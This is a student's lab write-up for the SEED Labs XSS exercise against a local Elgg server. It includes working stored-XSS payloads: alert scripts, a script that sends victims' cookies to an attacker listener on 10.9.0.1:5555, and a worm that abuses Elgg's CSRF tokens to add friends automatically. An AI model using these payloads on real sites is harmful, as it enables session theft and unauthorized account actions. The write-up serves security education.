# Seedlab Week #7 (Cross-Site Scripting XSS Attack Lab)

# Question 1

### Task 1: Posting a Malicious Message to Display an Alert Window

In this task, our goal was to embed a JavaScript program in the Elgg user profile. In this case, we will insert the following script:

```html
<script>alert('XSS');</script>
```

First, we logged in with the `alice` username and `seedalice` password. Then, we navigated to Alice's profile page at `http://www.seed-server.com/profile/alice`, clicked on `Edit profile`, selected the Editor mode option, pasted the JavaScript script into the `Brief description` field and saved it.

As a result, any user who opened our profile page saw an alert window on the screen, as shown below. This happens because when visiting the profile page, the script tag is loaded and executed which can be used for Cross Site Scripting.

<p align="center" justify="center">
  <img src="./assets/LOGBOOK7/task1.png"/>
</p>

### Task 2: Posting a Malicious Message to Display Cookies

In this task, we aimed to show the user's cookies in an alert window. For this, we used the following script:

```html
<script>alert(document.cookie);</script>
```

The solution for this task was similar to the previous one: we inserted the script in the `Brief description` field of Alice's profile. Then, we logged in from another account (`boby` username and `seedboby` password).

When the visiting Alice's profile page, the previous script was executed, and we saw our cookies in the alert box. This shows us a simple example of how the script can be used maliciously.

<p align="center" justify="center">
  <img src="./assets/LOGBOOK7/task2.png"/>
</p>

### Task 3: Stealing Cookies from the Victim’s Machine

In this task, our objective was to retrieve cookies from another user and access them from another source. To do this, we decided to use the following script:

```html
<script>
    document.write('<img src=http://10.9.0.1:5555?c=' + escape(document.cookie) + ' >');
</script>
```

This code sends the cookies to port 5555, so we needed to listen on this port by using the command `nc -lknv 5555` in our terminal. After this, if we placed the code in Alice's profile, log in with Boby's account and visit Alice's profile, the script would be executed and we would receive the cookies in the terminal.

The output from terminal:

<p align="center" justify="center">
  <img src="./assets/LOGBOOK7/task3.png"/>
</p>

### Task 4: Becoming the Victim’s Friend

For this final task, we needed to write an XSS worm that would automatically add Samy as a friend to anyone who opened Samy's page.

#### Analyze the HTTP request

Before preparing the script, we had to find out how the HTTP request for adding a new friend looks like. To achieve this, we used Firefox’s `Header Live` tool.

We opened the `Header Live` and logged in as Samy (`samy`, `seedsamy`). We then opened Alice's profile and clicked on `Add friend`. The extension allowed us to see the output shown below:

<p align="center" justify="center">
  <img src="./assets/LOGBOOK7/task4.1.png"/>
</p>

By analyzing the first request we are able to retrieve all the information necessary. We discovered that it was a `GET` request with this url: `http://www.seed-server.com/action/friends/add?friend=56&__elgg_ts=1731083830&__elgg_token=-TLgvgywckY6XBpLAcdx4w&__elgg_ts=1731083830&__elgg_token=-TLgvgywckY6XBpLAcdx4w`

#### JavaScript Worm

For the next step, we modified the script template to send a request to add a friend, using the request structure previously analyzed. The final result of this script was the following:

```html
<script type="text/javascript">
    window.onload = function () {
        var Ajax=null;
        var ts = "&__elgg_ts=" + elgg.security.token.__elgg_ts;  /* (1) */
        var token = "&__elgg_token=" + elgg.security.token.__elgg_token; /* (2) */
        
        //Construct the HTTP request to add Samy as a friend.
        var sendurl = "http://www.seed-server.com/action/friends/add?friend=59" + ts + token + ts + token;
        
        //Create and send Ajax request to add friend
        Ajax=new XMLHttpRequest();
        Ajax.open("GET", sendurl, true);
        Ajax.send();
    }
</script>
```

We constructed the `sendurl` variable based on the request URL, using Samy's friend ID (found as `"owner_guid":59` in the page HTML).

To prepare the attack, we then placed the code in Samy's `About me` section (using `Edit HTML` to insert the code) and visited his profile page with a different account (Boby).

By doing this, the script was executed and, as a result, simply by visiting Samy's page, Boby automatically sent a request to add Samy as a friend (which can be confirmed in Samy's perspective).

<p align="center" justify="center">
  <img src="./assets/LOGBOOK7/task4.2.png"/>
</p>

#### Task 4: Question 1

> Explain the purpose of Lines 1 and 2, why are they are needed?

After analyzing the request that is sent upon clicking the `Add Friend` button, we can see that a timestamp and a token are passed, in order validate the request. Therefore, the purpose of both lines (1) and (2) is to obtain/prepare these values so that we can send them in our request, as they are expected by server. 
Without these lines, our XSS attack would be unable to perform authenticated actions (like adding friends).  
Specifically the purpose of each line is:
  * First line: retrieve and add the timestamp security token.
  * Second line: retrieve and add the CSRF token.

#### Task4: Question 2

> If the Elgg application only provide the Editor mode for the "About Me" field, i.e., you cannot switch to the Text mode, can you still launch a successful attack?

To be able to launch the attack, we needed to add the `<script>` tag to the `About Me` section, so that when the website renders the tag, it executes the code contained within the script.  
This exploit can only happen in the Text mode because any text that is written in Editor mode is escaped, leading to safer text that is rendered exactly as plaintext when shown again in the `About Me` section.  
This can be seen if we write `<script>alert('XSS');</script>` in visual editor, save and then analyze it has HTML, which would show the following: `<p>&lt;script&gt;alert('XSS');&lt;/script&gt;</p>` (same output but characters are escaped).  
In conclusion, if the Elgg application only provided the Editor mode for the "About me" section, we could not launch this attack, at least not using the profile description.

# Question 2

This XSS attack can be classified as **Stored XSS**.  
In this attack, we start by saving the malicious payload (the JavaScript script) in the database ("About Me" section of the user profile) of a legitimate source (the Elgg website). After this, any user that accesses this website and visits the user profile will execute this malicious script and trigger its effects (add the user as a friend). This XSS pattern fits the **Stored XSS** category and is very similar to the Samy Worm studied in class.
